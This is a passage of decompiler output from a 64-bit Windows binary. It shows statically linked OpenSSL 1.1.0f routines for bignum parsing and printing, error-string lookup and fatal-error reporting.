    sub_140024610(v3 - 32, v3 + 88, v3 + 18, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 886);
    return 0i64;
  }
}
// 140022AA3: variable 'v3' is possibly undefined

//----- (0000000140022B10) ----------------------------------------------------
void __fastcall sub_140022B10(__int64 a1)
{
  if ( *(_DWORD *)(a1 + 152) == 5 )
  {
    sub_14003CB60(*(_QWORD *)(a1 + 160));
    *(_QWORD *)(a1 + 160) = 0i64;
  }
  else
  {
    *(_QWORD *)(a1 + 160) = 0i64;
  }
}

//----- (0000000140022B60) ----------------------------------------------------
__int64 __fastcall sub_140022B60(__int64 a1)
{
  __int64 v1; // rcx

  v1 = *(_QWORD *)(a1 + 16);
  if ( v1 )
    return sub_140027260(v1);
  else
    return 0i64;
}

//----- (0000000140022B90) ----------------------------------------------------
__int64 __fastcall sub_140022B90(__int64 a1)
{
  int *v2; // rsi
  unsigned int v3; // edi
  _DWORD *v4; // rax

  v2 = (int *)sub_140027CD0();
  v3 = 0;
  sub_14003C3A0(*(_QWORD *)(a1 + 144));
  *(_QWORD *)(a1 + 144) = 0i64;
  if ( v2 )
  {
    v4 = sub_14003C400();
    *(_QWORD *)(a1 + 144) = v4;
    if ( v4 )
    {
      if ( (unsigned int)sub_14003C480((__int64)v4, *(__int64 ***)(a1 + 16), v2) )
      {
        v3 = 1;
      }
      else
      {
        sub_14003C3A0(*(_QWORD *)(a1 + 144));
        *(_QWORD *)(a1 + 144) = 0i64;
      }
    }
  }
  sub_140027BE0((__int64)v2);
  return v3;
}

//----- (0000000140022C30) ----------------------------------------------------
__int64 __fastcall sub_140022C30(__int64 *a1, char *a2)
{
  char *v4; // rdx
  __int64 result; // rax

  v4 = a2 + 1;
  if ( *a2 != 45 )
    v4 = a2;
  if ( *v4 != 48 || ((v4[1] - 88) & 0xDF) != 0 )
  {
    result = sub_140022F40(a1, v4);
    if ( !(_DWORD)result )
      return result;
  }
  else
  {
    result = sub_140023120(a1, v4 + 2);
    if ( !(_DWORD)result )
      return result;
  }
  if ( *a2 == 45 )
  {
    if ( *(_DWORD *)(*a1 + 8) )
      *(_DWORD *)(*a1 + 16) = 1;
  }
  return 1i64;
}

//----- (0000000140022CC0) ----------------------------------------------------
_WORD *__fastcall sub_140022CC0(__int64 a1)
{
  _DWORD *v1; // rsi
  int v3; // eax
  signed int v4; // ebx
  __int64 v5; // r12
  __int64 *v6; // rbp
  size_t v7; // r13
  _WORD *v8; // r14
  _DWORD *v9; // rax
  _BYTE *v10; // rbx
  __int64 *v11; // rdi
  int v12; // ebx
  __int64 v13; // rax
  __int64 v14; // r9
  __int64 *v15; // rdi
  __int64 v16; // r9

  v1 = 0i64;
  v3 = sub_140027260(a1);
  v4 = ((unsigned int)((unsigned __int64)(5153960757i64 * v3) >> 32) >> 31)
     + 2
     + ((int)((unsigned __int64)(5153960757i64 * v3) >> 32) >> 2)
     + 3 * v3 / 1000;
  v5 = (int)(((int)((unsigned __int64)(1808407283i64 * v4) >> 32) >> 3)
           + 1
           + ((unsigned int)((unsigned __int64)(1808407283i64 * v4) >> 32) >> 31));
  v6 = (__int64 *)sub_14001D8E0(8 * v5);
  v7 = v4 + 3;
  v8 = sub_14001D8E0(v7);
  if ( !v8 || !v6 )
  {
    sub_140024610(3, 104, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_print.c", 74);
    goto LABEL_20;
  }
  v9 = sub_140026F70(a1);
  v1 = v9;
  if ( !v9 )
  {
LABEL_20:
    v12 = 0;
    goto LABEL_21;
  }
  v10 = v8;
  v11 = v6;
  if ( sub_140027160((__int64)v9) )
  {
    *v8 = 48;
    v12 = 1;
    goto LABEL_21;
  }
  if ( sub_1400270E0((__int64)v1) )
  {
    *(_BYTE *)v8 = 45;
    v10 = (char *)v8 + 1;
  }
  if ( !sub_140027160((__int64)v1) )
  {
    while ( v11 - v6 < v5 )
    {
      v13 = sub_14003E710((__int64)v1, 0x8AC7230489E80000ui64);
      *v11 = v13;
      if ( v13 == -1 )
        break;
      ++v11;
      if ( sub_140027160((__int64)v1) )
        goto LABEL_12;
    }
    goto LABEL_20;
  }
LABEL_12:
  v14 = *(v11 - 1);
  v15 = v11 - 1;
  sub_14002A5C0(v10, (unsigned __int64)v8 + v7 - (_QWORD)v10, "%llu", v14);
  for ( ; *v10; ++v10 )
    ;
  while ( v15 != v6 )
  {
    v16 = *--v15;
    sub_14002A5C0(v10, (unsigned __int64)v8 + v7 - (_QWORD)v10, "%019llu", v16);
    for ( ; *v10; ++v10 )
      ;
  }
  v12 = 1;
LABEL_21:
  sub_14001D930(v6);
  sub_140026FF0(v1);
  if ( v12 )
    return v8;
  sub_14001D930(v8);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140022F40) ----------------------------------------------------
__int64 __fastcall sub_140022F40(__int64 *a1, char *a2)
{
  _DWORD *v2; // rdi
  int v3; // r12d
  char *v4; // r14
  int v6; // ebx
  __int64 i; // rsi
  unsigned int v8; // ebp
  int v10; // eax
  unsigned __int64 v12; // rsi
  unsigned int v13; // edx
  int j; // ebx
  int v15; // eax

  v2 = 0i64;
  v3 = 0;
  v4 = a2;
  if ( !a2 || !*a2 )
    return 0i64;
  if ( *a2 == 45 )
  {
    v3 = 1;
    v4 = a2 + 1;
  }
  v6 = 0;
  for ( i = 0i64; i <= 0x1FFFFFFF; ++i )
  {
    if ( !isdigit((unsigned __int8)v4[i]) )
      break;
    ++v6;
  }
  if ( !v6 || v6 > 0x1FFFFFFF )
    goto LABEL_32;
  v8 = v6 + v3;
  if ( !a1 )
    return v8;
  v2 = (_DWORD *)*a1;
  if ( *a1 )
  {
    sub_140027560(*a1, 0i64);
    goto LABEL_16;
  }
  v2 = sub_140027200();
  if ( v2 )
  {
LABEL_16:
    if ( 4 * v6 <= 2147483584 )
    {
      v10 = (4 * v6 + 63) / 64;
      if ( v10 > v2[3] ? sub_140027910((__int64)v2, v10) : v2 )
      {
        v12 = 0i64;
        v13 = 0;
        if ( 19
           * (((int)((unsigned __int64)(1808407283i64 * v6) >> 32) >> 3)
            + 1
            + ((unsigned int)((unsigned __int64)(1808407283i64 * v6) >> 32) >> 31))
           - v6 != 19 )
          v13 = 19
              * (((int)((unsigned __int64)(1808407283i64 * v6) >> 32) >> 3)
               + 1
               + ((unsigned int)((unsigned __int64)(1808407283i64 * v6) >> 32) >> 31))
              - v6;
        for ( j = v6 - 1; j >= 0; --j )
        {
          v15 = *v4++;
          ++v13;
          v12 = v15 - 48 + 10 * v12;
          if ( v13 == 19 )
          {
            if ( !(unsigned int)sub_14003E8F0((__int64)v2, 0x8AC7230489E80000ui64)
              || !(unsigned int)sub_14003E600((__int64)v2, v12) )
            {
              goto LABEL_32;
            }
            v12 = 0i64;
            v13 = 0;
          }
        }
        sub_1400278D0((__int64)v2);
        *a1 = (__int64)v2;
        if ( v2[2] )
          v2[4] = v3;
        return v8;
      }
    }
LABEL_32:
    if ( !*a1 )
      sub_140026FF0(v2);
  }
  return 0i64;
}

//----- (0000000140023120) ----------------------------------------------------
__int64 __fastcall sub_140023120(__int64 *a1, _BYTE *a2)
{
  __int64 v2; // r15
  _BYTE *v3; // r12
  __int64 *v4; // rsi
  _DWORD *v5; // r14
  int v6; // ebp
  int v7; // ebx
  __int64 i; // rdi
  unsigned int v9; // edi
  int v11; // eax
  int v13; // r13d
  unsigned __int64 v14; // rdi
  int v15; // eax
  __int64 v16; // rbp
  char *v17; // rsi
  int v18; // eax
  _BYTE *v20; // [rsp+78h] [rbp+10h]
  int v21; // [rsp+80h] [rbp+18h]
  int v22; // [rsp+88h] [rbp+20h]

  v20 = a2;
  v2 = 0i64;
  v3 = a2;
  v21 = 0;
  v4 = a1;
  v5 = 0i64;
  v6 = 0;
  if ( !a2 || !*a2 )
    return 0i64;
  if ( *a2 == 45 )
  {
    v6 = 1;
    v3 = a2 + 1;
    v21 = 1;
    v20 = a2 + 1;
  }
  v7 = 0;
  for ( i = 0i64; i <= 0x1FFFFFFF; ++i )
  {
    if ( !isxdigit((unsigned __int8)v3[i]) )
      break;
    ++v7;
  }
  if ( !v7 || v7 > 0x1FFFFFFF )
    goto LABEL_33;
  v9 = v7 + v6;
  v22 = v7 + v6;
  if ( !v4 )
    return v9;
  v5 = (_DWORD *)*v4;
  if ( *v4 )
  {
    sub_140027560(*v4, 0i64);
    goto LABEL_16;
  }
  v5 = sub_140027200();
  if ( v5 )
  {
LABEL_16:
    if ( 4 * v7 <= 2147483584 )
    {
      v11 = (4 * v7 + 63) / 64;
      if ( v11 > v5[3] ? sub_140027910((__int64)v5, v11) : v5 )
      {
        v13 = 0;
        if ( v7 > 0 )
        {
          do
          {
            v14 = 0i64;
            v15 = v7;
            if ( v7 >= 16 )
              v15 = 16;
            v16 = v15;
            v17 = &v3[v7 - (__int64)v15];
            do
            {
              v18 = sub_14003BD50(*v17++);
              if ( v18 < 0 )
                v18 = 0;
              --v16;
              v14 = v18 | (16 * v14);
            }
            while ( v16 > 0 );
            ++v13;
            v3 = v20;
            v7 -= 16;
            *(_QWORD *)(v2 + *(_QWORD *)v5) = v14;
            v2 += 8i64;
          }
          while ( v7 > 0 );
          v4 = a1;
          v6 = v21;
          v9 = v22;
        }
        v5[2] = v13;
        sub_1400278D0((__int64)v5);
        *v4 = (__int64)v5;
        if ( v5[2] )
          v5[4] = v6;
        return v9;
      }
    }
LABEL_33:
    if ( !*v4 )
      sub_140026FF0(v5);
  }
  return 0i64;
}

//----- (0000000140023320) ----------------------------------------------------
__int64 __fastcall sub_140023320(__int64 a1, __int64 a2)
{
  int v2; // eax
  int v3; // edi
  int v7; // eax
  __int64 v8; // rsi
  int i; // ebx

  v3 = 0;
  if ( *(_DWORD *)(a2 + 16) && (unsigned int)sub_14002A430(a1, (__int64)"-", v2 - 31) != 1
    || sub_140027160(a2) && (unsigned int)sub_14002A430(a1, (__int64)"0", 1u) != 1 )
  {
    return 0i64;
  }
  v7 = *(_DWORD *)(a2 + 8) - 1;
  v8 = v7;
  if ( v7 >= 0 )
  {
    while ( 2 )
    {
      for ( i = 60; i >= 0; i -= 4 )
      {
        if ( v3 || ((*(_QWORD *)(*(_QWORD *)a2 + 8 * v8) >> i) & 0xF) != 0 )
        {
          if ( (unsigned int)sub_14002A430(
                               a1,
                               (__int64)&a0123456789abcd[(*(_QWORD *)(*(_QWORD *)a2 + 8 * v8) >> i) & 0xFi64],
                               1u) != 1 )
            return 0i64;
          v3 = 1;
        }
      }
      if ( --v8 >= 0 )
        continue;
      break;
    }
  }
  return 1i64;
}
// 140023347: variable 'v2' is possibly undefined

//----- (0000000140023440) ----------------------------------------------------
__int64 __fastcall sub_140023440(__int64 a1, __int64 a2)
{
  return off_140134AB0(a1, 0i64, a2);
}
// 140134AB0: using guessed type __int64 (__fastcall *off_140134AB0)(_QWORD, _QWORD, _QWORD);

//----- (0000000140023460) ----------------------------------------------------
__int64 __fastcall sub_140023460(char *a1, __int64 a2, __int64 a3)
{
  unsigned __int8 v3; // r9
  char *v4; // rax
  __int64 v5; // r10
  char v6; // dl
  char v7; // cl

  v3 = 0;
  v4 = a1;
  if ( a3 )
  {
    v5 = a2 - (_QWORD)a1;
    do
    {
      v6 = v4[v5];
      v7 = *v4++;
      v3 |= v7 ^ v6;
      --a3;
    }
    while ( a3 );
  }
  return v3;
}

//----- (00000001400234A0) ----------------------------------------------------
void __fastcall __noreturn sub_1400234A0(const char *a1, const char *a2, __int64 a3)
{
  sub_140023670("%s:%d: OpenSSL internal error: %s\n", a2, a3, a1);
  raise(22);
  exit(3);
}

//----- (00000001400234E0) ----------------------------------------------------
__int64 sub_1400234E0()
{
  __int64 (*_OPENSSL_isservice)(void); // rax
  HMODULE ModuleHandleW; // rax
  HWINSTA ProcessWindowStation; // rbx
  DWORD v3; // r9d
  unsigned __int64 v4; // rcx
  signed __int64 v5; // rcx
  void *v6; // rsp
  void *v7; // rsp
  unsigned __int64 v8; // rdx
  DWORD nLengthNeeded[2]; // [rsp+30h] [rbp+0h] BYREF

  _OPENSSL_isservice = (__int64 (*)(void))qword_140140980;
  if ( qword_140140980
    || ((ModuleHandleW = GetModuleHandleW(0i64)) == 0i64
      ? (_OPENSSL_isservice = (__int64 (*)(void))qword_140140980)
      : (__int64 (*)(void))(_OPENSSL_isservice = GetProcAddress(ModuleHandleW, "_OPENSSL_isservice"),
                            qword_140140980 = (__int64)_OPENSSL_isservice),
        _OPENSSL_isservice) )
  {
    if ( _OPENSSL_isservice != (__int64 (*)(void))-1i64 )
      return _OPENSSL_isservice();
  }
  else
  {
    qword_140140980 = -1i64;
  }
  ProcessWindowStation = GetProcessWindowStation();
  if ( !ProcessWindowStation
    || GetUserObjectInformationW(ProcessWindowStation, 2, 0i64, 0, nLengthNeeded)
    || GetLastError() != 122
    || nLengthNeeded[0] > 0x200 )
  {
    return 0xFFFFFFFFi64;
  }
  v3 = (nLengthNeeded[0] + 1) & 0xFFFFFFFE;
  nLengthNeeded[0] = v3;
  v4 = v3 + 17i64;
  if ( v4 <= (unsigned __int64)v3 + 2 )
    v4 = 0xFFFFFFFFFFFFFF0i64;
  v5 = v4 & 0xFFFFFFFFFFFFFFF0ui64;
  v6 = alloca(v5);
  v7 = alloca(v5);
  if ( !GetUserObjectInformationW(ProcessWindowStation, 2, nLengthNeeded, v3, nLengthNeeded) )
    return 0xFFFFFFFFi64;
  v8 = (unsigned __int64)((nLengthNeeded[0] + 1) & 0xFFFFFFFE) >> 1;
  nLengthNeeded[0] = (nLengthNeeded[0] + 1) & 0xFFFFFFFE;
  *((_WORD *)nLengthNeeded + v8) = 0;
  return wcsstr((const wchar_t *)nLengthNeeded, L"Service-0x") != 0i64;
}
// 140140980: using guessed type __int64 qword_140140980;

//----- (0000000140023670) ----------------------------------------------------
int sub_140023670(char *a1, ...)
{
  HANDLE StdHandle; // rax
  void *v2; // rbx
  _QWORD *v3; // rax
  DWORD v4; // edi
  int v5; // eax
  HANDLE v6; // rax
  unsigned __int64 v7; // rax
  const CHAR *v8; // r8
  unsigned __int64 v9; // rbx
  __int64 v10; // rcx
  signed __int64 v11; // rcx
  void *v12; // rsp
  void *v13; // rsp
  const wchar_t *v14; // rdi
  unsigned __int64 i; // rdx
  unsigned __int64 j; // r8
  _WORD *v17; // rdx
  _QWORD *v18; // rax
  void *v19; // rbx
  DWORD NumberOfBytesWritten[2]; // [rsp+50h] [rbp+0h] BYREF
  wchar_t Buffer[256]; // [rsp+60h] [rbp+10h] BYREF
  LPVOID lpRawData; // [rsp+2B8h] [rbp+268h] BYREF
  va_list lpRawDataa; // [rsp+2B8h] [rbp+268h]
  __int64 v26; // [rsp+2C0h] [rbp+270h]
  va_list WideCharStr; // [rsp+2C8h] [rbp+278h] BYREF

  va_start(WideCharStr, a1);
  va_start(lpRawDataa, a1);
  lpRawData = va_arg(WideCharStr, LPVOID);
  v26 = va_arg(WideCharStr, _QWORD);
  StdHandle = GetStdHandle(0xFFFFFFF4);
  v2 = StdHandle;
  if ( StdHandle && GetFileType(StdHandle) )
  {
    v3 = sub_140001930();
    v4 = 512;
    v5 = _stdio_common_vsprintf(*v3 | 1i64, (char *)Buffer, 0x200ui64, a1, 0i64, lpRawDataa);
    if ( v5 < 0 )
      v5 = -1;
    if ( v5 >= 0 )
      v4 = v5;
    LODWORD(v6) = WriteFile(v2, Buffer, v4, NumberOfBytesWritten, 0i64);
  }
  else
  {
    v7 = (unsigned int)(sub_140023980(a1) + 1);
    v9 = (unsigned int)v7;
    v7 *= 2i64;
    v10 = v7 + 15;
    if ( v7 + 15 <= v7 )
      v10 = 0xFFFFFFFFFFFFFF0i64;
    v11 = v10 & 0xFFFFFFFFFFFFFFF0ui64;
    v12 = alloca(v11);
    v13 = alloca(v11);
    v14 = (const wchar_t *)NumberOfBytesWritten;
    if ( NumberOfBytesWritten )
    {
      if ( !MultiByteToWideChar(0, 0, v8, v9, (LPWSTR)NumberOfBytesWritten, v9) )
      {
        for ( i = 0i64; i < v9; ++i )
          *((_WORD *)NumberOfBytesWritten + i) = a1[i];
      }
      for ( j = 0i64; j < v9; ++j )
      {
        if ( *((_WORD *)NumberOfBytesWritten + j) == 37 )
        {
          v17 = (_WORD *)NumberOfBytesWritten + j + 1;
LABEL_18:
          switch ( *v17 )
          {
            case '*':
            case '-':
            case '.':
            case '0':
            case '1':
            case '2':
            case '3':
            case '4':
            case '5':
            case '6':
            case '7':
            case '8':
            case '9':
              ++j;
              ++v17;
              goto LABEL_18;
            case 'C':
              *v17 = 99;
              break;
            case 'S':
              *v17 = 115;
              break;
            case 'c':
              *v17 = 67;
              break;
            case 's':
              *v17 = 83;
              break;
            default:
              continue;
          }
        }
      }
    }
    else
    {
      v14 = L"no stack?";
    }
    v18 = sub_140001930();
    _stdio_common_vswprintf(*v18 | 1i64, Buffer, 0xFFui64, v14, 0i64, lpRawDataa);
    Buffer[255] = 0;
    if ( (int)sub_1400234E0() <= 0 )
    {
      LODWORD(v6) = MessageBoxW(0i64, Buffer, L"OpenSSL: FATAL", 0x10u);
    }
    else
    {
      v6 = RegisterEventSourceW(0i64, L"OpenSSL");
      v19 = v6;
      if ( v6 )
      {
        *(_QWORD *)NumberOfBytesWritten = Buffer;
        ReportEventW(v6, 1u, 0, 0, 0i64, 1u, 0, (LPCWSTR *)NumberOfBytesWritten, 0i64);
        LODWORD(v6) = DeregisterEventSource(v19);
      }
    }
  }
  return (int)v6;
}
// 140023792: variable 'v8' is possibly undefined

//----- (0000000140023980) ----------------------------------------------------
int __fastcall sub_140023980(_BYTE *a1)
{
  unsigned int i; // eax

  for ( i = 0; *a1; ++i )
  {
    if ( i >= 0x80000000 )
      break;
    ++a1;
  }
  return i & 0x7FFFFFFF;
}

//----- (00000001400239A0) ----------------------------------------------------
void __fastcall sub_1400239A0(char *a1)
{
  int v1; // eax
  _BYTE *v3; // rbx
  __int64 v4; // rsi
  void **v5; // rdi

  if ( a1 )
  {
    v3 = a1 + 256;
    v4 = (unsigned int)(v1 - 16);
    v5 = (void **)(a1 + 128);
    do
    {
      if ( (*v3 & 1) != 0 )
      {
        sub_14001D930(*v5);
        *v5 = 0i64;
      }
      *(_DWORD *)v3 = 0;
      ++v5;
      v3 += 4;
      --v4;
    }
    while ( v4 );
    sub_14001D930(a1);
  }
}
// 1400239D0: variable 'v1' is possibly undefined

//----- (0000000140023A40) ----------------------------------------------------
void sub_140023A40(int a1, ...)
{
  va_list va; // [rsp+38h] [rbp+10h] BYREF

  va_start(va, a1);
  sub_140023A70(a1, (__int64)va);
}

//----- (0000000140023A70) ----------------------------------------------------
void __fastcall sub_140023A70(int a1, __int64 a2)
{
  int v2; // eax
  int v4; // r15d
  _BYTE *v6; // rax
  _BYTE *v7; // rdi
  int v8; // ebp
  int v9; // esi
  __int64 v10; // r14
  _BYTE *v11; // rbx
  unsigned int v12; // eax
  _BYTE *i; // rcx
  _BYTE *v14; // rax

  v4 = v2 + 48;
  v6 = sub_14001D8E0((unsigned int)(v2 + 49));
  v7 = v6;
  if ( v6 )
  {
    v8 = 0;
    v9 = 0;
    *v6 = 0;
    if ( a1 > 0 )
    {
      v10 = a2 - 8;
      do
      {
        v11 = *(_BYTE **)(v10 + 8);
        v10 += 8i64;
        if ( v11 )
        {
          v12 = 0;
          for ( i = v11; *i; ++v12 )
          {
            if ( v12 >= 0x80000000 )
              break;
            ++i;
          }
          v8 += v12 & 0x7FFFFFFF;
          if ( v8 > v4 )
          {
            v4 = v8 + 20;
            v14 = sub_14001D970(v7, v8 + 21, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\err\\err.c", 0x2D9u);
            if ( !v14 )
            {
              sub_14001D930(v7);
              return;
            }
            v7 = v14;
          }
          sub_14003BFE0(v7, v11, v4 + 1i64);
        }
        ++v9;
      }
      while ( v9 < a1 );
    }
    sub_140024820((__int64)v7, 3);
  }
}
// 140023A8B: variable 'v2' is possibly undefined

//----- (0000000140023B90) ----------------------------------------------------
void sub_140023B90()
{
  __int64 v0; // rbp
  __int64 v1; // rsi
  __int64 v2; // rbx
  __int64 v3; // rdi
  bool v4; // zf

  v0 = sub_140024090();
  v1 = 16i64;
  v2 = v0 + 256;
  v3 = v0 + 128;
  do
  {
    v4 = (*(_BYTE *)v2 & 1) == 0;
    *(_DWORD *)(v2 - 256) = 0;
    *(_DWORD *)(v2 - 192) = 0;
    if ( !v4 )
    {
      sub_14001D930(*(void **)v3);
      *(_QWORD *)v3 = 0i64;
    }
    *(_DWORD *)v2 = 0;
    *(_QWORD *)(v3 + 192) = 0i64;
    v3 += 8i64;
    *(_DWORD *)(v2 + 192) = -1;
    v2 += 4i64;
    --v1;
  }
  while ( v1 );
  *(_QWORD *)(v0 + 512) = 0i64;
}
// 140024090: using guessed type __int64 sub_140024090(void);

//----- (0000000140023C40) ----------------------------------------------------
void __fastcall sub_140023C40(unsigned int a1, char *a2, unsigned __int64 a3)
{
  unsigned int v5; // ebp
  unsigned int v7; // r12d
  __int64 v8; // r13
  __int64 v9; // r15
  __int64 v10; // r14
  char *v11; // rdx
  char *v12; // rcx
  char *v13; // rax
  __int64 v14; // rdi
  unsigned int v15; // eax
  _BYTE *i; // rcx
  __int64 v17; // rcx
  __int64 v18; // rbp
  char *v19; // r14
  unsigned __int64 v20; // rbx
  char *v21; // rax
  char v22[64]; // [rsp+40h] [rbp-108h] BYREF
  char v23[64]; // [rsp+80h] [rbp-C8h] BYREF
  char v24[64]; // [rsp+C0h] [rbp-88h] BYREF

  if ( a3 )
  {
    v5 = (a1 >> 12) & 0xFFF;
    v7 = a1 & 0xFFF;
    v8 = sub_140024150(a1);
    v9 = sub_140023E40(a1);
    v10 = sub_140024730(a1);
    if ( !v8 )
      sub_14002A5C0(v24, 0x40ui64, "lib(%lu)", HIBYTE(a1));
    if ( !v9 )
      sub_14002A5C0(v23, 0x40ui64, "func(%lu)", v5);
    if ( !v10 )
      sub_14002A5C0(v22, 0x40ui64, "reason(%lu)", v7);
    v11 = v22;
    v12 = v23;
    if ( v10 )
      v11 = (char *)v10;
    v13 = v24;
    if ( v9 )
      v12 = (char *)v9;
    if ( v8 )
      v13 = (char *)v8;
    sub_14002A5C0(a2, a3, "error:%08lX:%s:%s:%s", a1, v13, v12, v11);
    v14 = 0i64;
    v15 = 0;
    for ( i = a2; *i; ++v15 )
    {
      if ( v15 >= 0x80000000 )
        break;
      ++i;
    }
    v17 = v15;
    LODWORD(v17) = v15 & 0x7FFFFFFF;
    if ( v17 == a3 - 1 && a3 > 4 )
    {
      v18 = 4i64;
      v19 = &a2[a3 - 5];
      v20 = (unsigned __int64)v19;
      do
      {
        v21 = strchr(a2, 58);
        if ( !v21 || (unsigned __int64)v21 > v20 )
        {
          v21 = &v19[v14];
          v19[v14] = 58;
        }
        ++v20;
        a2 = v21 + 1;
        ++v14;
        --v18;
      }
      while ( v18 );
    }
  }
}

//----- (0000000140023E40) ----------------------------------------------------
__int64 __fastcall sub_140023E40(int a1)
{
  int v2; // eax
  __int64 v3; // rbx
  int v4; // edx
  _QWORD *v6; // rdi
  unsigned int v7[6]; // [rsp+20h] [rbp-18h] BYREF

  v2 = sub_140025C90(&dword_140140994, (void (*)(void))sub_140024A80);
  v3 = 0i64;
  v4 = 0;
  if ( v2 )
    v4 = dword_1401409A0;
  if ( !v4 )
    return 0i64;
  v7[0] = a1 & 0xFFFFF000;
  v6 = 0i64;
  sub_140025C50((_DWORD *)qword_1401409B0);
  if ( qword_140140998 )
    v6 = sub_14003EF50(qword_140140998, (__int64)v7);
  sub_140025CE0((_DWORD *)qword_1401409B0);
  if ( v6 )
    return v6[1];
  return v3;
}
// 140140994: using guessed type _DWORD dword_140140994;
// 140140998: using guessed type __int64 qword_140140998;
// 1401409A0: using guessed type int dword_1401409A0;
// 1401409B0: using guessed type __int64 qword_1401409B0;
// 140023E40: using guessed type unsigned int var_18[6];

//----- (0000000140023EE0) ----------------------------------------------------
__int64 __fastcall sub_140023EE0(_QWORD *a1, _DWORD *a2, _QWORD *a3, _DWORD *a4)
{
  __int64 v8; // rdi
  int v9; // eax
  int v11; // eax
  __int64 v12; // rcx
  unsigned int v13; // r13d
  __int64 v14; // rbp
  __int64 v15; // rax
  __int64 v16; // rsi
  __int64 v17; // rax

  v8 = sub_140024090();
  v9 = *(_DWORD *)(v8 + 516);
  if ( v9 == *(_DWORD *)(v8 + 512) )
    return 0i64;
  v11 = (v9 + 1) % 16;
  v12 = v11;
  v13 = *(_DWORD *)(v8 + 4i64 * v11 + 64);
  v14 = v11 + 16i64;
  *(_DWORD *)(v8 + 516) = v11;
  *(_DWORD *)(v8 + 4 * v14) = 0;
  if ( a1 && a2 )
  {
    v15 = *(_QWORD *)(v8 + 8i64 * v11 + 320);
    if ( v15 )
    {
      *a1 = v15;
      *a2 = *(_DWORD *)(v8 + 4 * v12 + 448);
    }
    else
    {
      *a1 = "NA";
      *a2 = 0;
    }
  }
  if ( a3 )
  {
    v17 = *(_QWORD *)(v8 + 8 * v14);
    if ( v17 )
    {
      *a3 = v17;
      if ( a4 )
        *a4 = *(_DWORD *)(v8 + 4 * v12 + 256);
    }
    else
    {
      *a3 = byte_1400D7DAE;
      if ( a4 )
        *a4 = 0;
    }
  }
  else
  {
    v16 = v8 + 4 * v12;
    if ( (*(_BYTE *)(v16 + 256) & 1) != 0 )
    {
      sub_14001D930(*(void **)(v8 + 8 * v14));
      *(_QWORD *)(v8 + 8 * v14) = 0i64;
    }
    *(_DWORD *)(v16 + 256) = 0;
  }
  return v13;
}
// 140024090: using guessed type __int64 sub_140024090(void);

//----- (0000000140024020) ----------------------------------------------------
__int64 sub_140024020()
{
  int v0; // eax
  int v1; // ecx
  unsigned int v3; // ebx

  v0 = sub_140025C90(&dword_140140994, (void (*)(void))sub_140024A80);
  v1 = 0;
  if ( v0 )
    v1 = dword_1401409A0;
  if ( !v1 )
    return 0i64;
  sub_140025D20((_DWORD *)qword_1401409B0);
  v3 = dword_140134FD0++;
  sub_140025CE0((_DWORD *)qword_1401409B0);
  return v3;
}
// 140134FD0: using guessed type int dword_140134FD0;
// 140140994: using guessed type _DWORD dword_140140994;
// 1401409A0: using guessed type int dword_1401409A0;
// 1401409B0: using guessed type __int64 qword_1401409B0;

//----- (0000000140024090) ----------------------------------------------------
char *sub_140024090()
{
  int v0; // eax
  int v1; // ecx
  char *v3; // rbx
  char *v4; // rax

  v0 = sub_140025C90(&dword_140140990, (void (*)(void))sub_140024B40);
  v1 = 0;
  if ( v0 )
    v1 = dword_1401409A4;
  if ( !v1 )
    return 0i64;
  v3 = (char *)sub_140025B80(dword_1401409A8);
  if ( !v3 )
  {
    v4 = (char *)sub_14001DC20(0x208ui64);
    v3 = v4;
    if ( !v4 )
      return 0i64;
    if ( !(unsigned int)sub_140025CC0(dword_1401409A8, (__int64)v4) )
    {
      sub_1400239A0(v3);
      return 0i64;
    }
    sub_14001E0C0(2, 0i64);
    sub_14001E740(2);
  }
  return v3;
}
// 140140990: using guessed type _DWORD dword_140140990;
// 1401409A4: using guessed type int dword_1401409A4;
// 1401409A8: using guessed type _DWORD dword_1401409A8[2];

//----- (0000000140024150) ----------------------------------------------------
__int64 __fastcall sub_140024150(int a1)
{
  int v2; // eax
  __int64 v3; // rbx
  int v4; // edx
  _QWORD *v6; // rdi
  unsigned int v7[6]; // [rsp+20h] [rbp-18h] BYREF

  v2 = sub_140025C90(&dword_140140994, (void (*)(void))sub_140024A80);
  v3 = 0i64;
  v4 = 0;
  if ( v2 )
    v4 = dword_1401409A0;
  if ( !v4 )
    return 0i64;
  v7[0] = a1 & 0xFF000000;
  v6 = 0i64;
  sub_140025C50((_DWORD *)qword_1401409B0);
  if ( qword_140140998 )
    v6 = sub_14003EF50(qword_140140998, (__int64)v7);
  sub_140025CE0((_DWORD *)qword_1401409B0);
  if ( v6 )
    return v6[1];
  return v3;
}
// 140140994: using guessed type _DWORD dword_140140994;
// 140140998: using guessed type __int64 qword_140140998;
// 1401409A0: using guessed type int dword_1401409A0;
// 1401409B0: using guessed type __int64 qword_1401409B0;
// 140024150: using guessed type unsigned int var_18[6];

//----- (00000001400241F0) ----------------------------------------------------
__int64 sub_1400241F0()
{
  int v0; // eax
  int v1; // ecx
  int *v3; // rbx
  _QWORD *v4; // rax
  int *v5; // rbx
  _QWORD *v6; // rax
  int *v7; // rbx
  _QWORD *v8; // rax
  int *v9; // rbx
  _QWORD *v10; // rax

  v0 = sub_140025C90(&dword_140140994, (void (*)(void))sub_140024A80);
  v1 = 0;
  if ( v0 )
    v1 = dword_1401409A0;
  if ( !v1 )
    return 0i64;
  v3 = &dword_140134AC0;
  sub_140025D20((_DWORD *)qword_1401409B0);
  v4 = (_QWORD *)qword_140140998;
  if ( qword_140140998
    || (v4 = sub_14003EE70(
               (__int64 (__fastcall *)(char *))sub_140024C90,
               (int (__cdecl *)(const char *, const char *))sub_140024C80),
        (qword_140140998 = (__int64)v4) != 0) )
  {
    if ( dword_140134AC0 )
    {
      while ( 1 )
      {
        sub_14003ED50((__int64)v4, (__int64)v3);
        v3 += 4;
        if ( !*v3 )
          break;
        v4 = (_QWORD *)qword_140140998;
      }
    }
  }
  sub_140025CE0((_DWORD *)qword_1401409B0);
  v5 = &dword_140134E20;
  sub_140025D20((_DWORD *)qword_1401409B0);
  v6 = (_QWORD *)qword_140140998;
  if ( qword_140140998
    || (v6 = sub_14003EE70(
               (__int64 (__fastcall *)(char *))sub_140024C90,
               (int (__cdecl *)(const char *, const char *))sub_140024C80),
        (qword_140140998 = (__int64)v6) != 0) )
  {
    if ( dword_140134E20 )
    {
      while ( 1 )
      {
